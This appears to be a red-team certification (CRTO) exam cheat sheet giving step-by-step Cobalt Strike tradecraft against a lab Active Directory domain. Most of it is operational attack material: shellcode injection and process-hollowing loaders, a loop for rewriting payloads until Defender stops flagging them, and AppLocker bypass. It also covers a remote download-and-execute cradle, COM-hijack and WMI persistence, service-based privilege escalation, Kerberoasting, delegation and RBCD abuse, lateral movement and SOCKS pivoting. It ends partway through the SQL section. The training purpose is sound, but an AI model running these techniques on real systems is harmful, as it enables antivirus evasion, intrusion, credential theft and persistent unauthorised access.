# CRTO Exam Day — Fast Reference Methodology

> Execute phases in order. Set persistence before moving laterally. OPSEC score = 50 pts — never disable Defender, never use default CS indicators.

---

## Phase 0 — CS Team Server Initial Connect (Attacker Host)

Start here before touching any target. All evasion must be in place before first beacon.

```bash
# SSH to team server
ssh attacker@10.0.0.5                          # Password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile                           # paste stage, post-ex, process-inject blocks

# Validate profile — fix any [!] before restarting
sudo /usr/bin/docker restart cobaltstrike-cs-1
sudo /usr/bin/docker logs cobaltstrike-cs-1    # confirm no [!] errors
```

**CS GUI — listeners to create:**
```
HTTP listener:  Host = www.bleepincomputer.com, Port = 80
SMB listener:   Pipename = <CUSTOM — NOT TSVCPIPE-*> (e.g. wkssvc-<guid>)
DNS listener:   (for elevated persistence — WMI)
TCP-local:      Port 1337 (for SQL/isolated segments)
```

**OPSEC-🟢SAFE** — all profile setup; no target contact yet.

---

## Phase 0a — Malware Development Essentials (Background — Pre-Exam Knowledge)

> **Course position:** Taught before Defence Evasion. Not a standalone lab — understand this to know *why* the Initial Access payloads work. Process hollowing is what `ngentask.exe` does internally.

Three-step shellcode execution progression (each step adds stealth):

### Step 1 — Local Execution (own process)
```csharp
// Simplest — beacon runs inside your own injector process (obvious parent, easy to kill)
byte[] buf = new byte[] { /* shellcode bytes */ };
IntPtr ptr  = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);  // RWX
Marshal.Copy(buf, 0, ptr, buf.Length);
CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
```

### Step 2 — Remote Process Injection (existing process)
```csharp
// Inject into a running process — beacon parent = chosen PID (better blend)
IntPtr hProc = OpenProcess(0x001F0FFF, false, targetPid);
IntPtr mem   = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
WriteProcessMemory(hProc, mem, buf, (uint)buf.Length, out _);
CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
```

### Step 3 — Process Hollowing (new suspended process) — used in Initial Access
```csharp
// Spawn a legitimate process suspended, overwrite its entry point, resume it
// Beacon parent = legitimate signed process (msedge.exe, ngentask.exe)
CreateProcessA(
    null,                    // lpApplicationName
    "C:\\Windows\\System32\\svchost.exe",
    null, null, false,
    CREATE_SUSPENDED,        // 0x4 — process won't execute until ResumeThread
    null, null,
    ref si, out pi
);
NtQueryInformationProcess(pi.hProcess, 0, ref pbi, ...);  // find PEB address
ReadProcessMemory(pi.hProcess, imageBaseAddr, ...);       // read PE headers → entry point
WriteProcessMemory(pi.hProcess, entryPoint, shellcode, ...);  // overwrite entry point
ResumeThread(pi.hThread);  // resume → jumps straight into shellcode
```

> **Why it matters for the exam:** The `ngentask.exe` Initial Access technique uses this principle — a legitimate .NET host loads your `AppDomainHijack.dll`, which allocates and executes beacon shellcode inside a suspended `msedge.exe`. The exam payload is pre-built; knowing this lets you adapt if it fails.

**OPSEC note:** Step 3 is `OPSEC-🟠CAUTION` — `CreateProcess(CREATE_SUSPENDED)` + `WriteProcessMemory` + `ResumeThread` in sequence is a known hollowing signature. Defender's memory scanner catches the shellcode if `stage.userwx true`. Mitigated by Artifact Kit + `userwx false`.

---

## Phase 0b — Antivirus Evasion: ThreatCheck → Ghidra Iteration Cycle

> **Course position:** Taught alongside/after Malware Essentials, feeds directly into the Artifact Kit build cycle in Phase 1. The iteration loop here IS the exam-day workflow for making artifacts clean.

### Why the Artifact Kit default isn't clean
Cobalt Strike ships Artifact Kit with a simple XOR-decryption `for` loop in `patch.c`. Defender has that exact bytecode sequence flagged. ThreatCheck locates the offset; Ghidra shows you what bytecode Defender is matching; you change the loop structure; rebuild; repeat.

### ThreatCheck → Ghidra Iteration Workflow

**Step 1 — Run ThreatCheck, get the flagged offset:**
```cmd
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
# Output: Byte[]: 0x00004C20
#         HEX: 31 C0 48 FF C8 ...
```

**Step 2 — Import artifact into Ghidra:**
```
ghidraRun.bat
→ New Project → Import File → artifact64big.exe
→ Double-click to open → Auto Analyse (accept all defaults)
```

**Step 3 — Navigate to flagged offset:**
```
Window → Go To
Enter: 0x4C20        ← hex offset from ThreatCheck output (prefix with 0x)
```
Ghidra highlights the disassembly at that address. The right panel shows decompiled C.

**Step 4 — Identify the flagged construct:**
Look for a `for` loop pattern in the decompiled view:
```c
// Signatured pattern Defender flags:
for ( int x = 0; x < length; x++ ) {
    buffer[x] = buffer[x] ^ key[x % 8];
}
```
This corresponds to `patch.c` lines ~45 (svc payload) and ~116 (exe payload).

**Step 5 — Map to patch.c and change loop direction:**
```
VSCode: File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
Open: src-common\patch.c
```
Replace both for-loops with backward while-loops (different compiled bytecode → different bytes on disk):
```c
// BEFORE (signatured):
for ( int x = 0; x < length; x++ ) { ... }

// AFTER (different bytecode — Defender's signature no longer matches):
int x = length;
while ( x-- ) {
    *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

**Step 6 — Rebuild and recheck:**
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```
```cmd
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
# No output = CLEAN. New offset output = new signature found → repeat from Step 1.
```

**Repeat until clean.** Each iteration addresses one signature. Typical: 2–3 iterations.

> **Exam note:** Once clean, load `artifact.cna`. Do not rebuild on exam day unless Defender starts catching your payloads mid-engagement — rebuilding invalidates all existing listeners.

---

## Phase 1 — Defence Evasion: Malleable C2 & Artifact/Resource Kit

Bypass Defender at every layer before generating any payload.

```bash
# WSL — Build Artifact Kit (patch decryption loop to backward while)
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
# Edit src-common/patch.c lines ~45 and ~116 → backward while loop
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts

# ThreatCheck — must be clean before loading
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"

# WSL — Build Resource Kit
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
# VSCode: fix template.x64.ps1 line 5: .Equals('Sys'+'tem.dll')
# VSCode: fix template.x64.ps1 line 32: replace Marshal.Copy with WriteProcessMemory
# VSCode: replace compress.ps1 with obfuscated Invoke-Obfuscation version

# ThreatCheck AMSI — must show "No threat found"
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

### CNA Scripts  

```
# CS Script Manager → Load all (Cobalt Strike → Script Manager → Load each):
C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
C:\Tools\cobaltstrike\custom-resources\resources.cna
C:\Tools\CS-Situational-Awareness-BOF\SA\SA.cna        # ldapsearch BOF — required for exam-recon.cna
C:\Tools\CS-Remote-OPs-BOF\Remote\Remote.cna            # remote BOF operations
C:\Tools\Kerbeus-BOF\kerbeus_cs.cna                     # krb_triage, krb_dump, krb_s4u
C:\Tools\exam-recon.cna                                  # custom: domain_recon_bulk + domain_recon_targeted
```

⚠️ **Load SA.cna BEFORE exam-recon.cna** — exam-recon.cna calls `fireAlias` into ldapsearch which is registered by SA.cna. Wrong load order = `non-existent function` error when running `domain_recon_bulk`.

**After first beacon checks in:**
```cs
beacon> process_browser                            // GUI tab — check for EDR, find explorer PID, right-click → inject/steal_token
beacon> ppid <explorer.exe PID>                    // OPSEC-🟢SAFE — spoof parent
beacon> spawnto x64 %windir%\sysnative\werfault.exe
```

---

## Phase 2 — AppLocker Bypass (Initial Workstation)

If `$ExecutionContext.SessionState.LanguageMode` returns `ConstrainedLanguage`, AppLocker is enforcing.

```powershell
# Confirm ConstrainedLanguage
$ExecutionContext.SessionState.LanguageMode

# Check if DLL rules are ON — empty = DLL enforcement OFF = rundll32 viable
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }

# Find writable paths under %WINDIR%\* (covered by default allow rule)
icacls C:\Windows\Tasks    # Authenticated Users:(RX,WD) — writable
```

```powershell
# Download beacon DLL from CS web server (IWR works in ConstrainedLanguage)
Invoke-WebRequest -Uri 'http://10.0.0.5:80/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'

# Execute via rundll32 (OPSEC-🟠CAUTION — EDR-visible but AppLocker compliant)
rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```

---

## Phase 3 — Initial Access

Assume-breach: you have creds for the foothold workstation. No phishing needed on exam day.

```powershell
# On foothold workstation — set APPDOMAIN env vars and run ngentask (OPSEC-🟢SAFE)
cd C:\Payloads\deals
$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
$env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
.\ngentask.exe
# Beacon appears from msedge.exe
```

**Alternative — Scripted Web Delivery (if AppDomainHijack not needed):**
```powershell
iex (new-object net.webclient).downloadstring('http://www.bleepincomputer.com/<uri>')
```

**Verify first beacon:**
```cs
beacon> getuid
beacon> process_browser // GUI tab — confirm beacon is inside msedge.exe, check for EDR, right-click → steal_token/inject
```

---

## Phase 3b — Beacon Context + Priority Enumeration (EVERY beacon, EVERY time)

Run this block on **every** new beacon before any attack action. ldapsearch is OPSEC-🟢SAFE
(BOF — no child process, no event logs) and gives you the full domain picture in seconds.
Do not skip it — you cannot make lateral movement or attack decisions without this data.

```cs
// Step 1 — beacon context (30 seconds)
beacon> sleep 3 20
beacon> ps
beacon> ppid <explorer.exe PID>                         // interactive session — use explorer.exe
// beacon> ppid <svchost.exe PID>                       // WinRM/service beacon — no explorer.exe, use svchost
beacon> spawnto x64 %windir%\sysnative\werfault.exe
beacon> getuid

// Step 2 — domain enumeration (OPSEC-🟢SAFE — BOF, run immediately)
// Combined query — users + computers + groups in one shot
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem

// Trust enumeration
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```

**Triage the output immediately — look for:**

| Finding | Attack |
|---------|--------|
| `servicePrincipalName` set on user account | Kerberoast it — `execute-assembly Rubeus.exe kerberoast /user:<svc> /nowrap` |
| `adminCount=1` with no DA/admin group | Leftover ACLs — check BloodHound for paths |
| `trustPartner` results | Forest trust attack path — see Phase 13/14 |
| Computer names — DB, FS, CS roles | Plan lateral movement targets |
| `dyork`, `Administrator` in Domain Admins | DA accounts — final targets |

> ⚠️ `ldapsearch` returns 0 results if beacon token is a WinRM/SCShell/WMI Type 3 network
> logon — non-forwardable, cannot authenticate to DC. Fix: `make_token CONTOSO\user pass`
> or `kerberos_ticket_use <kirbi>` before running ldapsearch.

---

## Phase 4 — Persistence (User-Level — no admin)

Deploy immediately after first beacon. Do this before privesc or lateral movement.
Technique: COM hijack via Microsoft Teams (`HKCU` — no admin, beacon inside `ms-teams.exe`).

```cs
// Generate DLL payload — Exit Function: Thread
// Payloads > Windows Stageless Payload > http > Windows DLL > Thread

// In beacon running as target user:
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
beacon> upload C:\Payloads\http_x64.dll
beacon> mv http_x64.dll Microsoft.Teams.HttpClient.dll
beacon> timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll

beacon> reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
beacon> reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```

Teams restart triggers DLL load → new beacon from `ms-teams.exe`.

---

## Phase 5 — Post Exploitation  

Hunt down the operational objective. Red team locate the objective, figure out who has access to it, and execute a attack chain to gain access, without getting caught.  

```cs
// session passing
beacon> spawnas CONTOSO\rsteel Passw0rd! tcp-local

//file system
beacon> file_browser

//downloading files
beacon> download C:\Users\pchilds\Desktop\flag.txt
// Sync Files > save the file to attacker host

// Processes
beacon> process_browser

// clipboard
beacon> clipboard

// registry
beacon> reg query x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
beacon> reg queryv x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ConsentPromptBehaviorAdmin

// Screenshots
beacon> printscreen

// vnc desktop
beacon> desktop

// Execution Commands
beacon> shell whoami /user

// Executing Custom Tools
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick $env:computername
beacon> powerpick Get-Domain

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe AntiVirus

beacon> inline-execute [/path/to/file.o] [args]
```

---

## Phase 6 — Privilege Escalation

Exploit weak service registry permissions → SYSTEM beacon.

```cs
// Enumerate services where low-priv users have FullControl (OPSEC-🟢SAFE — powerpick)

beacon> powerpick $lowpriv = @('Everyone','BUILTIN\Users','NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject]@{ServiceName=$_.PSChildName; Identity=$ace.IdentityReference.Value; Rights=$ace.RegistryRights}}}}

// Returns Controlable Windows Service

// Set spawnto for service payload before generating
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

// Payloads > Windows Stageless Payload > http > Windows Service EXE → http_x64.svc.exe

beacon> sc_stop BadWindowsService
beacon> cd C:\Temp
beacon> upload C:\Payloads\http_x64.svc.exe
beacon> sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
beacon> sc_start BadWindowsService
// Elevated SYSTEM beacon appears

// Restore service (clean up)
beacon> sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
beacon> rm http_x64.svc.exe
beacon> sc_start BadWindowsService
```

---

## Phase 7 — Elevated Persistence (SYSTEM-Level — requires elevated beacon)

WMI event subscription triggers on GPO refresh — survives reboots, no user interaction.

```cs
// On SYSTEM beacon:
// Generate DNS payload → Payloads > Windows Stageless Payload > dns > exe → dns_x64.exe
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe windbg.exe

// Install WMI subscription (triggers on Event 1502 = GPO refresh)
beacon> powershell-import C:\Tools\WmiPersistence.ps1
beacon> psinject [BEACON PID] x64 Add-WmiPersistence

// Trigger manually to verify
beacon> execute gpupdate /target:computer /force
// New DNS beacon appears within seconds

// Cleanup (after exam — or before submit if instructed)
beacon> psinject [BEACON PID] x64 Remove-WmiPersistence
```

**OPSEC-🟠CAUTION** — WMI subscription creation logged; use generic names in the script (`Debug Trace`, `Debug Consumer`) to blend with legitimate WMI activity.

---

## Phase 8 — Credential Access

Target: dump credentials without touching LSASS directly. Prefer Rubeus/BOF over Mimikatz.

```cs
// Kerberoasting — OPSEC-🟢SAFE (in-memory, no LSASS touch)
// First enumerate SPNs to avoid honeypot accounts
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName

// Kerberoast specific account only (avoid honeypots)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

// AS-REP Roasting
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

// Triage + dump Kerberos tickets (BOF — no LSASS raw read, preferred over any LSASS dump)
beacon> krb_triage
beacon> krb_dump /user:rsteel /service:krbtgt
```

**Hashcat offline crack:**
```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt   # Kerberoast
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt    # AS-REP
```

---

## Phase 9 — User Impersonation

Impersonate a user via their Kerberos TGT without knowing their password.

```cs
// Load BOF script first (one-time):
// Cobalt Strike > Script Manager > Load > C:\Tools\Kerbeus-BOF\kerbeus_cs.cna

beacon> krb_triage                                    // find rsteel's krbtgt ticket
beacon> krb_dump /user:rsteel /service:krbtgt         // dump TGT (base64 output)

// Save kirbi to disk (run in PowerShell on attacker desktop)
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64]"))

// Create sacrificial logon session and inject ticket
beacon> make_token CONTOSO\rsteel FakePass            // fake password — never validated
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
beacon> run klist                                     // verify ticket loaded

// Verify access
beacon> ls \\lon-ws-1\c$

// Drop impersonation
beacon> rev2self
```

**Alternative — steal token from running process (preferred when process exists):**
```cs
beacon> process_browser                               // find rsteel's process PID
beacon> steal_token <pid>                             // OPSEC-🟢SAFE — in-process token dupe
```

---

## Phase 10 — Discovery (OPSEC-🟢SAFE LDAP via BOF)

All `ldapsearch` commands run as BOFs — no child process, no disk write.

```cs
// Domain structure + GPOs
beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor

// Users + computers + groups
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor

// BloodHound — copy logs from team server and parse with BOFHound
// Ubuntu WSL on attacker desktop:
scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .    # Password: Passw0rd!
bofhound -i logs
// Load JSON output into BloodHound (http://localhost:8080)

// Key BloodHound Cypher queries
Match (n:GPO) return n                                // find GPOs
MATCH p=shortestPath((u:User)-[*1..]->(c:Computer{name:"LON-DC-1.CONTOSO.COM"})) return p
```

---

## Phase 11 — Lateral Movement

Use highest-OPSEC method that works. Impersonate before moving.

```cs
// ALWAYS impersonate with steal_token first — not make_token alone
// make_token without kerberos_ticket_use = fake creds = ERROR_LOGON_FAILURE on WinRM (lab-confirmed)
beacon> ps                               // find target user process
beacon> steal_token <pid>               // OPSEC-🟢SAFE — preferred auth method for all jump commands

// Test WinRM reachability
beacon> powerpick Test-WSMan <target>

// Option 1 — WinRM (OPSEC-🟢SAFE — preferred, no service, no Event 7045/7040)
beacon> spawnto x64 %windir%\sysnative\werfault.exe
beacon> jump winrm64 <target> smb_custom
// If ERROR_FILE_NOT_FOUND → wait 10-15s → retry ONCE (EDR scan timing gap)
// If fails twice → fall to Option 2
// ⚠️ winrm64 lands as the steal_token user (NOT SYSTEM) — run getsystem if SYSTEM needed

// Option 2 — SCShell (OPSEC-🟠CAUTION — Event 7040 x2, transient disk write, lands as SYSTEM)
// CS > Script Manager > Load > C:\Tools\SCShell\CS-BOF\scshell.cna
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump scshell64 <target> smb_custom
// scshell64 lands as SYSTEM directly — no getsystem needed

// Option 3 — Pre-staged payload via WinRM (EDR environments — use custom-built payload)
beacon> cd \\<target>\c$\Windows\Temp
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec winrm <target> C:\Windows\Temp\smb_x64.exe
beacon> rm \\<target>\c$\Windows\Temp\smb_x64.exe   // cleanup after beacon checks in

// Option 4 — WMI (OPSEC-🟠CAUTION — no service, Event 4688)
beacon> remote-exec wmi <target> C:\Windows\Temp\smb_x64.exe

// Option 5 — psexec (OPSEC-🔴UNSAFE — LAST RESORT — Event 7045)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump psexec64 <target> smb_custom

beacon> rev2self     // drop impersonation after lateral move succeeds
```

**Decision flow:**
```
steal_token → winrm64 (retry once on ERROR_FILE_NOT_FOUND)
  → scshell64 → remote-exec winrm + staged payload → remote-exec wmi → psexec64 (🔴 last resort)
```

**After winrm64 — check if SYSTEM is needed:**
```cs
beacon> getuid
// If returns domain user (not SYSTEM) and SYSTEM is required (e.g. krb_dump machine TGT):
beacon> getsystem    // OPSEC-🟠CAUTION — named pipe impersonation, works from admin context
// steal_token <SYSTEM-pid> fails from winrm64 wsmprovhost.exe context — use getsystem instead

// ⚠️ Lab-confirmed (2026-04-19): getsystem token breaks execute-assembly — "No .NET runtime found"
// If you need to run execute-assembly (e.g. Rubeus monitor) after getsystem:
beacon> rev2self     // drop getsystem token — rsteel admin context is sufficient for execute-assembly
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
```

---

## Phase 12 — SOCKS Pivoting Tunnel

Tunnel attacker-desktop tools through a beacon into isolated network segments.

```cs
// Start SOCKS5 proxy (no admin needed — run from medium-integrity beacon)
beacon> socks 1080 socks5
```

```powershell
# Attacker desktop — add hosts file entry for internal DNS resolution
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

```
# Proxifier: Profile > Proxy Servers > Add
  Address: 10.0.0.5 | Port: 1080 | SOCKS5
# Proxification Rules > Add
  Name: Beacon | Target hosts: 10.10.120.0/23 | Action: Proxy SOCKS5 10.0.0.5
```

```powershell
# LDAP service ticket via SOCKS (proxified netonly session)
runas /netonly /user:CONTOSO\rsteel powershell.exe       # Password: FakePass
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
Get-ADUser -Filter * -Server lon-dc-1                    # enumerate via SOCKS
```

---

## Phase 13 — Kerberos Attacks

### Kerberoasting / AS-REP Roasting → see Phase 7

### Unconstrained Delegation

```cs
// Enumerate hosts with unconstrained delegation (DCs excluded from attack path)
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName

// Move to unconstrained delegation host (lon-ws-1), then:
beacon> krb_triage                              // harvest cached TGTs (passive)
beacon> ldapsearch samAccountName=dyork --attributes memberOf  // confirm DA
beacon> krb_dump /luid:<LUID> /service:krbtgt   // dump DA TGT

// Coerce authentication (active — if no cached TGT)
// SpoolSample / PetitPotam to force DC auth to unconstrained delegation host
// Then krb_triage again to catch the DC's TGT
```

### Constrained Delegation (with Protocol Transition)

```cs
// Enumerate hosts with msDS-AllowedToDelegateTo set
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

// Move to constrained delegation host (lon-ws-1) as SYSTEM — dump machine TGT
beacon> krb_triage                              // check for cached DA TGTs first — may skip S4U entirely
beacon> krb_dump /luid:3e7 /service:krbtgt      // ⚠️ NO 0x prefix — /luid:0x3e7 = "Invalid luid" error

// S4U abuse — get service ticket impersonating Administrator
beacon> krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
// Save kirbi on attacker desktop PowerShell:
// [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64]"))

// make_token is OPTIONAL when beacon is SYSTEM (lab-confirmed 2026-04-19)
// kerberos_ticket_use injects into SYSTEM session — remote server sees Administrator auth regardless
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
beacon> ls \\lon-fs-1\c$
beacon> rev2self
beacon> kerberos_ticket_purge
```

### RBCD (Resource-Based Constrained Delegation)

```cs
// Requires: principal with WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity (ACE type 3f78c3e5-...)
// Lab flow — uses rsteel (Server Admins group) + SOCKS/Proxifier + Rubeus on attacker desktop

// --- PHASE 1: SOCKS setup (from pchilds medium-integrity beacon) ---
beacon> socks 1080 socks5
// Proxifier → add team server 10.0.0.5:1080 SOCKS5 → rule: 10.10.120.0/23 → SOCKS5

// On attacker desktop (admin PowerShell):
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
Set-MpPreference -DisableRealtimeMonitoring $true

// --- PHASE 2: Get LDAP ticket via pchilds delegation ---
beacon> krb_tgtdeleg    // from pchilds beacon — OPSEC-🟢SAFE, no SYSTEM needed
// Copy base64 TGT output

runas /netonly /user:CONTOSO\pchilds powershell    // attacker desktop
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[pchilds-TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt

// --- PHASE 3: Enumerate via PowerView (in runas pchilds powershell) ---
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
// Resolve SID:
Get-DomainObject -LDAPFilter '(objectSid=<SID>)' -Server 'lon-dc-1'
// ⚠️ Lab: SID 1107 = "Server Admins" group, member rsteel. Controls: FS-1, WS-1, DB-1, DB-2, CS-1

// --- PHASE 4: Get rsteel LDAP ticket (from SYSTEM beacon) ---
beacon> krb_triage    // find rsteel LUID — varies per session, do NOT hardcode
beacon> krb_dump /luid:<rsteel-LUID> /service:krbtgt    // ⚠️ no 0x prefix
// In runas pchilds powershell:
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[rsteel-TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt

// --- PHASE 5: Check existing RBCD and add entry ---
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
// ⚠️ LON-FS-1 already has LON-WS-1 — must preserve it
$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'

// --- PHASE 6: Dump machine TGT and S4U (from SYSTEM beacon) ---
beacon> krb_dump /luid:3e7 /service:krbtgt    // lon-wkstn-1$ machine TGT, SYSTEM required, no 0x prefix
// In runas pchilds powershell:
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[wkstn1-TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
// ⚠️ Rubeus writes: _cifs_lon-fs-1 (no extension, underscore prefix) — check exact filename in output

// --- PHASE 7: Inject and access (in beacon) ---
// make_token OPTIONAL — lab-confirmed working without it (no Event 4648)
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
beacon> ls \\lon-fs-1\c$
beacon> rev2self
beacon> kerberos_ticket_purge

// --- PHASE 8: Restore RBCD ---
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
```

### Service Name Substitution (S4U2self abuse)

```cs
// Useful when you have a service TGT but need a different service class
// Substitute the service name in the ticket SPN without re-requesting
beacon> krb_s4u /ticket:[TGT] /service:host/<target> /impersonateuser:Administrator
```

---

## Phase 14 — SQL Servers

> ⚠️ **BEACON CONTEXT IS CRITICAL — wrong beacon = permission denied (42000). Each command is labelled.**
>
> Beacon chain built in this phase:
> `wkstn-1 (pchilds) → wkstn-1 (rsteel) → [sql-clr] → lon-db-1 (mssql_svc, SMB) → [link from lon-db-1] → lon-db-2 (mssql_svc, SMB) → [SweetPotato] → lon-db-2 (SYSTEM, tcp-local)`

```cs
// ── SETUP ─────────────────────────────────────────────────────────────────────
// Load SQL-BOF: Cobalt Strike > Script Manager > Load > C:\Tools\SQL-BOF\SQL\SQL.cna
// Load Kerbeus: C:\Tools\Kerbeus-BOF\kerbeus_cs.cna

// ── ENUMERATION [BEACON: wkstn-1 | USER: pchilds] ────────────────────────────
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
// Note SPN: MSSQLSvc/lon-db-1.contoso.com:1433 — needed for ticket requests
beacon> sql-info lon-db-1       // IsSysAdmin: False as pchilds
beacon> sql-whoami lon-db-1     // guest/public as pchilds — need sysadmin user
beacon> ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
